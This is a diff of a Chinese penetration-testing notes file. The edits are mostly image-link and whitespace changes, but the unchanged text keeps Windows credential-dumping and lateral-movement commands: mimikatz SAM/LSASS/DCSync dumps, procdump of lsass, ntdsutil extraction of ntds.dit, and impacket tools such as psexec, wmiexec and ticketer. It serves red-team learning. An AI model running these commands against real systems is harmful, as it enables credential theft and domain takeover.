@@ -28,16 +28,16 @@ online模式其实就是将mimikatz上传到目标系统上`system`身份运行`
 以SYSTEM权限启动exe文件后运行以下命令
 
 ```bash
-privilege::debug			#获得debug权限
-token::elevate				#模拟一个system令牌
+privilege::debug				#获得debug权限
+token::elevate					#模拟一个system令牌
 lsadump::sam					#dumpSAM数据库
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751080155011-361cc7b1-04b2-4c17-b682-e974a3967cd4.png)
+![image-20250711083949700](./assets/image-20250711083949700.png)
 
 拿到hash后就是破解
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751080269330-c20b4b9e-e237-4412-90d3-e4097f3cdecc.png)
+![image-20250711084002422](./assets/image-20250711084002422.png)
 
 ## offline
 导出目标系统上的SAM数据库文件
@@ -51,7 +51,7 @@ reg save hklm\system {保存路径}system.hiv
 
 然后将导出的文件下载到攻击机（本地），以管理员或`SYSTEM`权限运行mimikatz
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751081087321-e264407c-580d-4a5b-b90d-a1c89ac92941.png)
+![image-20250711084015311](./assets/image-20250711084015311.png)
 
 获取hash
 
@@ -59,7 +59,7 @@ reg save hklm\system {保存路径}system.hiv
 lsadump::sam /sam:E:\sam.hiv /system:E:\system.hiv
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751081547119-a5c30afb-829c-4cb1-987c-01d49a15ddc2.png)
+![image-20250711084028250](./assets/image-20250711084028250.png)
 
 # 通过Lsass的内存获取密码
 ## 目标系统中运行mimikatz获取明文密码
@@ -67,22 +67,22 @@ lsadump::sam /sam:E:\sam.hiv /system:E:\system.hiv
 
 ```bash
 privilege::debug
-log			#启用日志，会在运行目录生成mimikatz.log文件
+log									#启用日志，会在运行目录生成mimikatz.log文件
 sekurlsa::logonpasswords			#通过各种方法获取明文密码
 ```
 
 关于`sekurlsa::logonpasswords`获取密码发方式有：
 
 ```bash
-sekurlsa::msv	#获取 HASH (LM,NTLM) 
-sekurlsa::wdigest #通过可逆的方式去内存中读取明文密码
-sekurlsa::Kerberos #假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码
-sekurlsa::tspkg #通过tspkg读取明文密码
-sekurlsa::livessp #通过livessp 读取明文密码
-sekurlsa::ssp #通过ssp 读取明文密码
+sekurlsa::msv		#获取 HASH (LM,NTLM) 
+sekurlsa::wdigest 	#通过可逆的方式去内存中读取明文密码
+sekurlsa::Kerberos 	#假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码
+sekurlsa::tspkg 	#通过tspkg读取明文密码
+sekurlsa::livessp 	#通过livessp 读取明文密码
+sekurlsa::ssp 		#通过ssp 读取明文密码
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751085968120-32a83e0d-0d35-4203-a4d6-c797f1a437d0.png)
+![image-20250711084128285](./assets/image-20250711084128285.png)
 
 ## procdump结合mimikatz离线获取明文密码
 下载：[https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump](https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump)
@@ -95,7 +95,7 @@ procdump是微软的工具，一般不会被杀软杀掉，但mimikatz会
 procdump64.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751087122596-7d6c6254-58d5-498e-8fd1-9f8ecc11e871.png)
+![image-20250711084144605](./assets/image-20250711084144605.png)
 
 下载生成的lsass.dmp文件到本地，使用mimikatz解析
 
@@ -105,7 +105,7 @@ sekurlsa::minidump E:\lsass.dmp
 sekurlsa::logonpasswords
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751087449474-a4cb3d1f-a48a-4ed4-91fe-d6fa070553a6.png)
+![image-20250711084156603](./assets/image-20250711084156603.png)
 
 # 提取域控的ntds.dit并获取密码
 ntds.dit文件一般位于：`<font style="color:rgb(51, 51, 51);">C:\Windows\ntds\ntds.dit</font>`
@@ -161,7 +161,7 @@ cscript vssown.vbs /create c
 cscript vssown.vbs /list
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751422283309-2e5c1310-88ad-410d-81ff-704e7b71da23.png)
+![image-20250711084219859](./assets/image-20250711084219859.png)
 
 + 复制文件
 
@@ -187,7 +187,7 @@ Ntdsutil.exe 是一个为 Active Directory 提供管理设施的命令行工具�
 ntdsutil snapshot "activate instance ntds" create quit quit
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751424071060-98b10dd2-c0ee-4c21-ba38-eb0a4a82d472.png)
+![image-20250711084233367](./assets/image-20250711084233367.png)
 
 + 挂载快照
 
@@ -196,7 +196,7 @@ ntdsutil snapshot "mount <ID>" quit quit
 ntdsutil snapshot "mount {f3ce5a64-11d7-4bcf-9858-81442e40d6cb}" quit quit
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751424091340-7be50cda-12cb-4f47-b519-79826c5dd2ca.png)
+![image-20250711084242846](./assets/image-20250711084242846.png)
 
 + 复制文件
 
@@ -204,7 +204,7 @@ ntdsutil snapshot "mount {f3ce5a64-11d7-4bcf-9858-81442e40d6cb}" quit quit
 copy C:\$SNAP_202009291002_VOLUMEC$\windows\ntds\ntds.dit c:\ntds.dit
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751424117547-ff50549d-90ef-4613-af55-d0741b282ee0.png)
+![image-20250711084258755](./assets/image-20250711084258755.png)
 
 + 卸载并删除快照
 
@@ -214,7 +214,7 @@ ntdsutil snapshot "mount <ID>" "delete <ID>" quit quit
 ntdsutil snapshot "mount {f3ce5a64-11d7-4bcf-9858-81442e40d6cb}" "delete {f3ce5a64-11d7-4bcf-9858-81442e40d6cb}" quit quit
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751424137962-947b414e-aa0a-4b1f-a8cc-ed659eb82832.png)
+![image-20250711084311844](./assets/image-20250711084311844.png)
 
 ### Ntdsutil创建IFM（域管理员权限）
 <font style="color:rgb(51, 51, 51);">除了利用上面那种操作来获取Ntds.dit外，还可以利用Ntdsutil.exe创建媒体安装集(IFM)来用于提取NTDS.dit文件。</font>**<font style="color:rgb(51, 51, 51);">在使用ntdsutil创建创建媒体安装集(IFM)时，会自动进行生成快照、加载、将ntds.dit、计算机的SAM和SYSTEM文件复制到目标文件夹中等操作，我们可以利用该过程获取NTDS.dit文件。</font>**
@@ -227,11 +227,11 @@ ntdsutil snapshot "mount {f3ce5a64-11d7-4bcf-9858-81442e40d6cb}" "delete {f3ce5a
 ntdsutil "ac i ntds" "ifm" "create full c:/test" q q 
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751424661372-d97fb039-a696-4728-943c-02fc90d5d60a.png)
+![image-20250711084321803](./assets/image-20250711084321803.png)
 
 test文件夹中内容
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751424750098-bdfe2f21-516d-4c1b-b33b-83e5f1f9e717.png)
+![image-20250711084332777](./assets/image-20250711084332777.png)
 
 + 将ntds.dit复制出来
 
@@ -255,7 +255,7 @@ powershell中导入脚本，然后使用powershell运行`copy-vss`命令，运�
 Set-ExecutionPolicy Unrestricted
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751430098278-49d639bf-6c32-4c1b-b41c-1f3f1a4823a8.png)
+![image-20250711084342293](./assets/image-20250711084342293.png)
 
 指定路径
 
@@ -308,7 +308,7 @@ reg save hklm\system {保存路径}system.hiv
 python secretsdump.py -system /目录/system.hive -ntds /目录/ntds.dit LOCAL
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751457665442-9bef2868-f106-4e51-a284-2ecf14909b66.png)
+![image-20250711084403497](./assets/image-20250711084403497.png)
 
 更多详细见impacket使用总结
 
@@ -319,7 +319,7 @@ python secretsdump.py -system /目录/system.hive -ntds /目录/ntds.dit LOCAL
 lsadump::dcsync /domain:xxx.com /all /csv
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751459824302-730c46c4-94d3-42ed-8c97-13455644290b.png)
+![image-20250711084414295](./assets/image-20250711084414295.png)
 
 
 
@@ -336,7 +336,7 @@ Invoke-DCSync -DumpForest | ft -wrap -autosize    // 导出域内所有用户的
 Invoke-DCSync -DumpForest -Users @("administrator") | ft -wrap -autosize      // 导出域内administrator账户的hash
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751460531186-e268503a-d52a-4c9e-b53f-404b434b1aea.png)
+![image-20250711084425738](./assets/image-20250711084425738.png)
 
 ### ntds.dit总结
 上面的各种利用工具只是一部分，还有很多其它方式，多寻找文章吧
@@ -362,7 +362,7 @@ python3 -m pipx install impacket
 
 安装完成后家目录下的`.local/bin/`中会有对应的impacket中py文件的软链接
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751457878813-0652c969-dd5d-43b1-904f-c1275e14e697.png)
+![image-20250711084449176](./assets/image-20250711084449176.png)
 
 可选：
 
@@ -380,11 +380,11 @@ export PATH="$PATH:/root/.local/bin"
 export PATH="$PATH:/root/.local/bin"
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751505533844-54b02862-829b-40ea-8ce3-a6bb629e18d1.png)
+![image-20250711084500478](./assets/image-20250711084500478.png)
 
 使用例子
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751457957975-2922fcaf-5726-4462-bc49-406292239289.png)
+![image-20250711084513017](./assets/image-20250711084513017.png)
 
 ## 基础使用
 ### lookupsid.py
@@ -394,7 +394,7 @@ export PATH="$PATH:/root/.local/bin"
 lookupsid.py domain/user:password@ip
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751522852911-b4a1dcc9-773f-4d99-b05b-cd8a8e87fd65.png)
+![image-20250711084533620](./assets/image-20250711084533620.png)
 
 ### Rpcdump.py
 <font style="color:rgb(51, 51, 51);">该脚本将转储在目标上注册的RPC端点和字符串bindings列表。它也会尝试将它们与一些知名的端点进行匹配。</font>
@@ -403,7 +403,7 @@ lookupsid.py domain/user:password@ip
 rpcdump.py domain/user:password@ip
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751523010493-961d7a0e-f072-486e-9f66-9b305d49865d.png)
+![image-20250711084542858](./assets/image-20250711084542858.png)
 
 ### Samrdump.py
 <font style="color:rgb(51, 51, 51);">与MSRPC套件中的安全帐户管理器远程接口通信的应用程序。它将为我们列出目标系统上的用户帐户，可用资源共享以及通过此服务导出的其他敏感信息</font>
@@ -412,7 +412,7 @@ rpcdump.py domain/user:password@ip
 samrdump.py domain/user:password@ip
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751523027074-ceabdf31-72a4-4cea-9486-84ce964c9e17.png)
+![image-20250711084556812](./assets/image-20250711084556812.png)
 
 ### Sniff.py
 <font style="color:rgb(51, 51, 51);">一个简单的数据包嗅探脚本。使用pcapy库来侦听通过指定接口传输的数据包。与wireshark类似</font>
@@ -435,7 +435,7 @@ sniffer.py
 wmiquery.py domain/user:password@ip
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751522071339-b507267e-ae06-47aa-bf5c-65d196fe44cd.png)
+![image-20250711084604231](./assets/image-20250711084604231.png)
 
 ## 进阶使用
 通用选项
@@ -466,11 +466,11 @@ psexec.py domain/user@ip -hashs :NTLM
 -remote-binary-name remote_binary_name #指定上传文件的名称，默认随机
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751522919968-4cfa4197-5fa7-4e80-ab5e-11390265e637.png)
+![image-20250711084613567](./assets/image-20250711084613567.png)
 
 该功能需要使用的账号具有管理员权限
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751522942857-de7616ae-3ee4-4c66-823a-cf3d2c543405.png)
+![image-20250711084619871](./assets/image-20250711084619871.png)
 
 ### Wmiexec.py
 <font style="color:rgb(51, 51, 51);">它会生成一个使用Windows Management Instrumentation的半交互式shell，并以管理员身份运行。你不需要在目标服务器上安装任何的服务/代理，因此它非常的隐蔽。</font>
@@ -491,7 +491,7 @@ wmiexec.py domain/user:password@ip
 -com-version MAJOR_VERSION:MINOR_VERSION #设置DCOM版本
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751513570154-afbbbfd6-f7d4-4e7e-a191-9b7ea0eb388d.png)
+![image-20250711084629757](./assets/image-20250711084629757.png)
 
 ### atexec.py
 <font style="color:rgb(51, 51, 51);">通过Task Scheduler服务在目标系统上执行命令，并返回输出结果。</font>
@@ -507,7 +507,7 @@ atexec.py domain/user:password@ip systeminfo
 -silentcommand #不运行cmd.exe，直接运行命令
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751522317943-61e3ebda-43df-4eaa-b490-5ff6da4c3bab.png)
+![image-20250711084637493](./assets/image-20250711084637493.png)
 
 ### smbexec.py
 可使用密码认证、hash认证、kerberos认证。
@@ -526,11 +526,11 @@ smbexec.py domain/user:password@ip
 -shell-type {cmd,powershell} #设置返回的Shell类型
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751528440468-32383f02-f041-4285-bdf4-03c591a06f0c.png)
+![image-20250711084646045](./assets/image-20250711084646045.png)
 
 另外还有一些选项是硬编码的，可以去py文件中修改
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751528570146-9c11d2eb-5c58-450b-a95c-dae92138ba18.png)
+![image-20250711084651991](./assets/image-20250711084651991.png)
 
 ### dcomexec.py
 一般使用MMC20，而且DCOM有时候会遇到0x800706ba的错误，一般都是被防火墙拦截。
@@ -550,7 +550,7 @@ dcomexec.py -object MMC20 domain/user:password@ip
 -silentcommand #不运行cmd.exe，直接运行命令
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751529158123-342e5d34-2e40-4a93-b81c-28805eafa4de.png)
+![image-20250711084701422](./assets/image-20250711084701422.png)
 
 ### getTGT.py
 通过认证后去DC请求TGT并保存。
@@ -561,7 +561,7 @@ dcomexec.py -object MMC20 domain/user:password@ip
 getTGT.py domain/user:password -dc-ip DCip
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751531282326-10fe98ed-7b05-47a9-919a-92b819d2789d.png)
+![image-20250711084722112](./assets/image-20250711084722112.png)
 
 ### getST.py
 通过认证后去DC请求ST并保存。
@@ -580,7 +580,7 @@ getST.py test/administrator:'admin@123456' -dc-ip 192.168.106.155 -spn cifs/WIN7
 -force-forwardable  #通过CVE-2020-17049强制忽略校验票据是否可转发
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751531458857-7e1cd8d6-69af-49a8-ba56-8c03b15d8a7b.png)
+![image-20250711084731894](./assets/image-20250711084731894.png)
 
 ### getPac.py
 查询test用户的PAC，可以看到登录次数、密码错误次数之类的
@@ -589,11 +589,11 @@ getST.py test/administrator:'admin@123456' -dc-ip 192.168.106.155 -spn cifs/WIN7
 getPac.py test.com/administrator:password -targetUser test
 ```
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751532834314-b5ada234-05bb-49e6-8825-6835e9df2f3d.png)
+![image-20250711084741958](./assets/image-20250711084741958.png)
 
 注意账号前的格式变成了`test.com`，且不能指定dcip，所以`test.com`会经过dns解析,需要在`/etc/hosts`中指定`test.com`的IP为域控IP。
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751532989472-6799ac59-be19-4a90-99e7-d3ceb547d4bb.png)
+![image-20250711084752400](./assets/image-20250711084752400.png)
 
 ### GetUserSPNs.py
 查询`test.com`中的用户的SPN有哪些，只需要任意一个域用户即可利用，只要有用户的SPN可以请求，可以获取其TGS爆破其密码
@@ -672,7 +672,7 @@ ticketer.py -nthash 服务账号hash -domain-sid 域SID -domain 域名 -spn 目�
 + CT_SK：Client-TGS SessionKey（客户端-TGS会话密钥）
 + CS_SK：Client-Server SessionKey（客户端-服务端会话密钥）
 
-![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751527978286-79dcad55-7bea-40d6-a07c-b69d1f25a20c.png)
+![image-20250711084808086](./assets/image-20250711084808086.png)
 
 
 
